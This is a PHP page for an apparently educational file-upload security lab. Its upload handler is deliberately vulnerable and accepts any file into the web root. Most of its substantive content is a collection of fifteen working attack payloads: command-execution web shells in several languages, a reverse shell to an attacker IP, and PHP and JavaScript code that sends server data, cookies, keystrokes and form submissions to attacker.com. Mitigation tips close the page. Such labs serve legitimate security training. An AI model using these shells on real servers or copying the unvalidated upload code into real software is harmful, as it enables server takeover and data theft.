<?php
// Lab 1: Basic File Upload
// Vulnerability: File upload without proper validation

session_start();

$message = '';
$uploaded_files = [];

// Initialize uploaded files if not exists
if (!isset($_SESSION['uploaded_files'])) {
    $_SESSION['uploaded_files'] = [];
}

$uploaded_files = $_SESSION['uploaded_files'];

// Simulate file upload (vulnerable to injection)
function process_file_upload($file) {
    // Vulnerable: Basic file upload without validation
    if (empty($file['name'])) {
        return false;
    }
    
    // Vulnerable: Direct file upload without validation
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_path = $upload_dir . basename($file['name']);
    
    if (move_uploaded_file($file['tmp_name'], $file_path)) {
        return $file_path;
    }
    
    return false;
}

// Handle file upload
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['upload_file'])) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === UPLOAD_ERR_OK) {
        $file_path = process_file_upload($_FILES['file']);
        
        if ($file_path) {
            $file_data = [
                'name' => $_FILES['file']['name'],
                'type' => $_FILES['file']['type'],
                'size' => $_FILES['file']['size'],
                'path' => $file_path,
                'uploaded_at' => date('Y-m-d H:i:s')
            ];
            
            $_SESSION['uploaded_files'][] = $file_data;
            $uploaded_files = $_SESSION['uploaded_files'];
            $message = '<div class="alert alert-success">File uploaded successfully!</div>';
        } else {
            $message = '<div class="alert alert-danger">File upload failed!</div>';
        }
    } else {
        $message = '<div class="alert alert-danger">Please select a file to upload!</div>';
    }
}

// Handle file deletion
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_file'])) {
    $file_index = (int)($_POST['file_index'] ?? -1);
    
    if ($file_index >= 0 && $file_index < count($uploaded_files)) {
        $file = $uploaded_files[$file_index];
        if (file_exists($file['path'])) {
            unlink($file['path']);
        }
        
        unset($_SESSION['uploaded_files'][$file_index]);
        $_SESSION['uploaded_files'] = array_values($_SESSION['uploaded_files']);
        $uploaded_files = $_SESSION['uploaded_files'];
        $message = '<div class="alert alert-success">File deleted successfully!</div>';
    } else {
        $message = '<div class="alert alert-danger">Invalid file index!</div>';
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lab 1: Basic File Upload - File Upload Labs</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.9.1/font/bootstrap-icons.css">
    
    <style>
        :root {
            --primary-dark: #1a1f36;
            --accent-green: #48bb78;
            --accent-blue: #4299e1;
            --accent-orange: #ed8936;
            --accent-red: #f56565;
        }
        
        body {
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
            color: #e2e8f0;
            min-height: 100vh;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        .navbar-brand {
            font-weight: 700;
            font-size: 1.5rem;
            color: var(--accent-green) !important;
        }

        .nav-link {
            font-weight: 500;
            transition: color 0.3s;
        }

        .nav-link:hover {
            color: var(--accent-green) !important;
        }

        .hero-section {
            background: linear-gradient(rgba(15, 23, 42, 0.9), rgba(15, 23, 42, 0.9)), 
                        url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231e293b"/><path d="M0 0L100 100M100 0L0 100" stroke="%23374151" stroke-width="1"/></svg>');
            padding: 2rem 0;
            border-bottom: 1px solid #2d3748;
            margin-bottom: 2rem;
        }

        .hero-title {
            font-size: 2rem;
            font-weight: 700;
            background: linear-gradient(90deg, #48bb78, #4299e1);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
        }

        .hero-subtitle {
            font-size: 1rem;
            color: #cbd5e0;
        }

        .section-title {
            margin-top: 30px;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 1.5rem;
            position: relative;
            padding-bottom: 10px;
        }

        .section-title::after {
            content: '';
            position: absolute;
            bottom: 0;
            left: 0;
            width: 60px;
            height: 4px;
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border-radius: 2px;
        }

        .card {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            color: #e2e8f0;
        }

        .card-header {
            background: rgba(15, 23, 42, 0.5);
            border-bottom: 1px solid #334155;
            font-weight: 600;
            padding: 1rem 1.5rem;
        }

        .form-control, .form-select {
            background: rgba(30, 41, 59, 0.7);
            border: 1px solid #334155;
            color: #e2e8f0;
            padding: 0.75rem 1rem;
        }

        .form-control:focus, .form-select:focus {
            background: rgba(30, 41, 59, 0.9);
            border-color: var(--accent-green);
            box-shadow: 0 0 0 0.2rem rgba(72, 187, 120, 0.25);
            color: #e2e8f0;
        }

        .form-label {
            font-weight: 500;
            color: #cbd5e0;
        }

        .btn-primary {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            border: none;
            padding: 0.75rem 1.5rem;
            font-weight: 600;
            transition: all 0.3s;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
        }

        .vulnerability-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-orange);
        }

        .payload-examples {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-blue);
        }

        .danger-zone {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
            border-left: 4px solid var(--accent-red);
        }

        pre {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            color: #e2e8f0;
            border: 1px solid #334155;
            overflow-x: auto;
        }

        .lab-info {
            background: rgba(30, 41, 59, 0.7);
            border-radius: 12px;
            border: 1px solid #334155;
            padding: 1.5rem;
            margin-bottom: 2rem;
        }

        .lab-badge {
            background: linear-gradient(90deg, var(--accent-green), var(--accent-blue));
            color: #1a202c;
            font-weight: 600;
            padding: 0.5rem 1rem;
            border-radius: 6px;
            display: inline-block;
            margin-bottom: 1rem;
        }

        .uploaded-display {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1.5rem;
            margin: 1rem 0;
            border-left: 4px solid var(--accent-green);
        }

        .test-urls {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin-bottom: 1rem;
            border-left: 4px solid var(--accent-blue);
        }

        .input-info {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
        }

        .sensitive-data {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-red);
        }

        .code-block {
            background: rgba(15, 23, 42, 0.7);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-blue);
            font-family: 'Courier New', monospace;
            white-space: pre-wrap;
        }

        .file-upload-warning {
            background: rgba(15, 23, 42, 0.5);
            border-radius: 8px;
            padding: 1rem;
            margin: 0.5rem 0;
            border-left: 4px solid var(--accent-orange);
        }
    </style>
</head>
<body>
    <nav class="navbar navbar-expand-md navbar-dark sticky-top" style="background-color: var(--primary-dark);">
        <div class="container-fluid">
            <a class="navbar-brand" href="index.php">
                <i class="bi bi-arrow-left me-2"></i>Back to File Upload Labs
            </a>
            <button class="navbar-toggler" type="button" data-bs-toggle="collapse"
                data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false"
                aria-label="Toggle navigation">
                <span class="navbar-toggler-icon"></span>
            </button>

            <div class="collapse navbar-collapse" id="navbarSupportedContent">
                <ul class="navbar-nav me-auto mb-2 mb-lg-0">
                    <li class="nav-item">
                        <a class="nav-link active" href="../about">About</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link active" href="../contact">Contact Us</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>

    <div class="hero-section">
        <div class="container">
            <h1 class="hero-title">Lab 1: Basic File Upload</h1>
            <p class="hero-subtitle">File upload without proper validation</p>
        </div>
    </div>

    <div class="container mb-5">
        <div class="lab-info">
            <span class="lab-badge">Difficulty: Low</span>
            <h3 class="section-title">Lab Overview</h3>
            <p>This lab demonstrates a basic file upload vulnerability where users can upload files without proper validation. The application accepts any file type and stores it directly on the server without checking file content or extensions.</p>
            <p><strong>Objective:</strong> Upload malicious files to achieve server compromise or data exfiltration.</p>
        </div>

        <div class="row">
            <div class="col-lg-6">
                <div class="card mb-4">
                    <div class="card-header text-center">
                        <i class="bi bi-code-slash me-2"></i>Vulnerable Code
                    </div>
                    <div class="card-body">
                        <pre>
// Vulnerable: Basic file upload without validation
function process_file_upload($file) {
    if (empty($file['name'])) {
        return false;
    }
    
    // Vulnerable: Direct file upload without validation
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_path = $upload_dir . basename($file['name']);
    
    if (move_uploaded_file($file['tmp_name'], $file_path)) {
        return $file_path;
    }
    
    return false;
}</pre>
                    </div>
                </div>
            </div>
            
            <div class="col-lg-6">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-upload me-2"></i>File Upload
                    </div>
                    <div class="card-body">
                        <?php echo $message; ?>
                        
                        <div class="file-upload-warning">
                            <h5>⚠️ File Upload Warning</h5>
                            <p>This lab demonstrates file upload vulnerabilities. You can upload:</p>
                            <ul>
                                <li>PHP files (webshells)</li>
                                <li>Executable files</li>
                                <li>Script files</li>
                                <li>Any file type</li>
                            </ul>
                        </div>
                        
                        <div class="input-info">
                            <h5>File Upload Examples</h5>
                            <p>Try uploading these files:</p>
                            <ul>
                                <li><code>webshell.php</code> - PHP web shell</li>
                                <li><code>malicious.js</code> - JavaScript file</li>
                                <li><code>backdoor.exe</code> - Executable file</li>
                                <li><code>config.txt</code> - Configuration file</li>
                            </ul>
                        </div>
                        
                        <form method="POST" enctype="multipart/form-data">
                            <input type="hidden" name="upload_file" value="1">
                            <div class="mb-3">
                                <label for="file" class="form-label">Select File to Upload</label>
                                <input type="file" class="form-control" id="file" name="file" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Upload File</button>
                        </form>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-12">
                <div class="card">
                    <div class="card-header">
                        <i class="bi bi-files me-2"></i>Uploaded Files
                    </div>
                    <div class="card-body">
                        <?php if (empty($uploaded_files)): ?>
                            <p class="text-muted">No files uploaded yet.</p>
                        <?php else: ?>
                            <?php foreach ($uploaded_files as $index => $file): ?>
                                <div class="input-info">
                                    <h5>File <?php echo $index + 1; ?>: <?php echo htmlspecialchars($file['name']); ?></h5>
                                    <p><strong>Type:</strong> <?php echo htmlspecialchars($file['type']); ?></p>
                                    <p><strong>Size:</strong> <?php echo number_format($file['size']); ?> bytes</p>
                                    <p><strong>Path:</strong> <?php echo htmlspecialchars($file['path']); ?></p>
                                    <p><strong>Uploaded:</strong> <?php echo htmlspecialchars($file['uploaded_at']); ?></p>
                                    
                                    <div class="mt-2">
                                        <a href="<?php echo htmlspecialchars($file['path']); ?>" class="btn btn-sm btn-primary" target="_blank">View File</a>
                                        <form method="POST" class="d-inline">
                                            <input type="hidden" name="delete_file" value="1">
                                            <input type="hidden" name="file_index" value="<?php echo $index; ?>">
                                            <button type="submit" class="btn btn-sm btn-danger">Delete</button>
                                        </form>
                                    </div>
                                </div>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>

        <div class="row mt-4">
            <div class="col-md-6">
                <div class="vulnerability-info">
                    <h5><i class="bi bi-bug me-2"></i>Vulnerability Details</h5>
                    <ul>
                        <li><strong>Type:</strong> File Upload</li>
                        <li><strong>Severity:</strong> High</li>
                        <li><strong>Method:</strong> POST</li>
                        <li><strong>Issue:</strong> No file validation or filtering</li>
                    </ul>
                </div>
            </div>
            
            <div class="col-md-6">
                <div class="payload-examples">
                    <h5><i class="bi bi-target me-2"></i>Test Files</h5>
                    <ul>
                        <li><code>webshell.php</code> - PHP web shell</li>
                        <li><code>malicious.js</code> - JavaScript file</li>
                        <li><code>backdoor.exe</code> - Executable file</li>
                        <li><code>config.txt</code> - Configuration file</li>
                    </ul>
                </div>
            </div>
        </div>

        <div class="test-urls">
            <h5><i class="bi bi-link me-2"></i>File Upload Payloads</h5>
            <p>Use these files to test file upload vulnerabilities:</p>
            
            <h6>1. Basic PHP Web Shell (webshell.php):</h6>
            <div class="code-block"><?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?></div>

            <h6>2. Advanced PHP Web Shell (advanced_shell.php):</h6>
            <div class="code-block"><?php
if (isset($_POST['cmd'])) {
    $output = shell_exec($_POST['cmd']);
    echo "<pre>$output</pre>";
}
?>
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form></div>

            <h6>3. File Manager Web Shell (filemanager.php):</h6>
            <div class="code-block"><?php
if (isset($_GET['action'])) {
    switch ($_GET['action']) {
        case 'list':
            $files = scandir('.');
            foreach ($files as $file) {
                echo $file . "<br>";
            }
            break;
        case 'read':
            if (isset($_GET['file'])) {
                echo file_get_contents($_GET['file']);
            }
            break;
        case 'write':
            if (isset($_POST['file']) && isset($_POST['content'])) {
                file_put_contents($_POST['file'], $_POST['content']);
                echo "File written successfully";
            }
            break;
    }
}
?>
<a href="?action=list">List Files</a>
<form method="get">
    <input type="hidden" name="action" value="read">
    <input type="text" name="file" placeholder="File to read">
    <input type="submit" value="Read">
</form>
<form method="post">
    <input type="hidden" name="action" value="write">
    <input type="text" name="file" placeholder="File to write">
    <textarea name="content" placeholder="Content"></textarea>
    <input type="submit" value="Write">
</form></div>

            <h6>4. Database Web Shell (db_shell.php):</h6>
            <div class="code-block"><?php
$host = 'localhost';
$db = 'test';
$user = 'root';
$pass = '';

try {
    $pdo = new PDO("mysql:host=$host;dbname=$db", $user, $pass);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    
    if (isset($_POST['query'])) {
        $stmt = $pdo->prepare($_POST['query']);
        $stmt->execute();
        $results = $stmt->fetchAll(PDO::FETCH_ASSOC);
        
        echo "<pre>";
        print_r($results);
        echo "</pre>";
    }
} catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
}
?>
<form method="post">
    <textarea name="query" placeholder="SQL Query"></textarea>
    <input type="submit" value="Execute">
</form></div>

            <h6>5. Reverse Shell (reverse_shell.php):</h6>
            <div class="code-block"><?php
$ip = '192.168.1.100';  // Attacker IP
$port = 4444;           // Attacker Port

$sock = fsockopen($ip, $port);
if ($sock) {
    fwrite($sock, "Connected\n");
    
    while (!feof($sock)) {
        $cmd = fgets($sock);
        $output = shell_exec($cmd);
        fwrite($sock, $output);
    }
    
    fclose($sock);
}
?></div>

            <h6>6. Data Exfiltration Shell (exfil_shell.php):</h6>
            <div class="code-block"><?php
$url = 'https://attacker.com/steal';

$data = [
    'server' => $_SERVER,
    'files' => $_FILES,
    'post' => $_POST,
    'get' => $_GET,
    'cookie' => $_COOKIE,
    'session' => $_SESSION
];

$options = [
    'http' => [
        'header' => "Content-type: application/json\r\n",
        'method' => 'POST',
        'content' => json_encode($data)
    ]
];

$context = stream_context_create($options);
file_get_contents($url, false, $context);
?></div>

            <h6>7. Keylogger Shell (keylogger.php):</h6>
            <div class="code-block"><?php
if (isset($_POST['keys'])) {
    $keys = $_POST['keys'];
    $log = date('Y-m-d H:i:s') . " - " . $keys . "\n";
    file_put_contents('keylog.txt', $log, FILE_APPEND);
}

if (isset($_GET['log'])) {
    echo file_get_contents('keylog.txt');
}
?>
<script>
document.addEventListener('keypress', function(e) {
    fetch('', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'keys=' + e.key
    });
});
</script>
<a href="?log=1">View Keylog</a></div>

            <h6>8. File Upload Shell (upload_shell.php):</h6>
            <div class="code-block"><?php
if (isset($_FILES['file'])) {
    $upload_dir = 'uploads/';
    if (!file_exists($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }
    
    $file_path = $upload_dir . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $file_path)) {
        echo "File uploaded: " . $file_path;
    }
}
?>
<form method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form></div>

            <h6>9. System Information Shell (info_shell.php):</h6>
            <div class="code-block"><?php
echo "<h2>System Information</h2>";
echo "<p><strong>PHP Version:</strong> " . phpversion() . "</p>";
echo "<p><strong>Server:</strong> " . $_SERVER['SERVER_SOFTWARE'] . "</p>";
echo "<p><strong>OS:</strong> " . php_uname() . "</p>";
echo "<p><strong>Current Directory:</strong> " . getcwd() . "</p>";
echo "<p><strong>Disk Space:</strong> " . disk_free_space('.') . " bytes free</p>";

echo "<h2>Environment Variables</h2>";
echo "<pre>";
foreach ($_ENV as $key => $value) {
    echo "$key = $value\n";
}
echo "</pre>";

echo "<h2>Process List</h2>";
echo "<pre>";
if (function_exists('shell_exec')) {
    echo shell_exec('ps aux');
}
echo "</pre>";
?></div>

            <h6>10. Network Scanner Shell (network_shell.php):</h6>
            <div class="code-block"><?php
if (isset($_GET['scan'])) {
    $target = $_GET['target'];
    $ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995];
    
    echo "<h2>Port Scan Results for $target</h2>";
    foreach ($ports as $port) {
        $connection = @fsockopen($target, $port, $errno, $errstr, 1);
        if ($connection) {
            echo "Port $port: Open<br>";
            fclose($connection);
        } else {
            echo "Port $port: Closed<br>";
        }
    }
}
?>
<form method="get">
    <input type="text" name="target" placeholder="Target IP">
    <input type="hidden" name="scan" value="1">
    <input type="submit" value="Scan">
</form></div>

            <h6>11. JavaScript Web Shell (webshell.js):</h6>
            <div class="code-block">// JavaScript Web Shell
fetch('https://attacker.com/steal', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        cookie: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        userAgent: navigator.userAgent,
        url: window.location.href
    })
});

// Keylogger
document.addEventListener('keypress', function(e) {
    fetch('https://attacker.com/keys', {
        method: 'POST',
        body: 'key=' + e.key
    });
});

// Form hijacking
var forms = document.getElementsByTagName('form');
for (var i = 0; i < forms.length; i++) {
    forms[i].addEventListener('submit', function(e) {
        var data = new FormData(this);
        fetch('https://attacker.com/forms', {
            method: 'POST',
            body: data
        });
    });
}</div>

            <h6>12. Python Web Shell (webshell.py):</h6>
            <div class="code-block">#!/usr/bin/env python3
import cgi
import subprocess
import os

print("Content-Type: text/html\n")

form = cgi.FieldStorage()
if 'cmd' in form:
    cmd = form['cmd'].value
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        print(f"<pre>{result.stdout}</pre>")
        if result.stderr:
            print(f"<pre>Error: {result.stderr}</pre>")
    except Exception as e:
        print(f"<pre>Error: {e}</pre>")

print("""
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
""")</div>

            <h6>13. Perl Web Shell (webshell.pl):</h6>
            <div class="code-block">#!/usr/bin/perl
use CGI;
use strict;

my $cgi = new CGI;
print $cgi->header;

if ($cgi->param('cmd')) {
    my $cmd = $cgi->param('cmd');
    my $output = `$cmd 2>&1`;
    print "<pre>$output</pre>";
}

print <<HTML;
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
HTML</div>

            <h6>14. Ruby Web Shell (webshell.rb):</h6>
            <div class="code-block">#!/usr/bin/env ruby
require 'cgi'

cgi = CGI.new
puts cgi.header

if cgi['cmd'] && !cgi['cmd'].empty?
    cmd = cgi['cmd']
    output = `#{cmd} 2>&1`
    puts "<pre>#{output}</pre>"
end

puts <<HTML
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
HTML</div>

            <h6>15. Bash Web Shell (webshell.sh):</h6>
            <div class="code-block">#!/bin/bash
echo "Content-Type: text/html"
echo ""

if [ "$REQUEST_METHOD" = "POST" ]; then
    read -r cmd
    echo "<pre>"
    eval "$cmd" 2>&1
    echo "</pre>"
fi

cat << 'EOF'
<form method="post">
    <input type="text" name="cmd" placeholder="Enter command">
    <input type="submit" value="Execute">
</form>
EOF</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Remote Code Execution (RCE) through web shells</li>
                <li>Server compromise and data breaches</li>
                <li>Web shell installation and persistence</li>
                <li>Data exfiltration and sensitive information disclosure</li>
                <li>Denial of Service (DoS) attacks</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement proper file type validation and whitelisting</li>
                    <li>Use file content validation instead of relying on extensions</li>
                    <li>Implement file size limits and upload quotas</li>
                    <li>Store uploaded files outside web root directory</li>
                    <li>Implement proper file permissions and access controls</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual file upload patterns</li>
                    <li>Implement Content Security Policy (CSP)</li>
                </ul>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
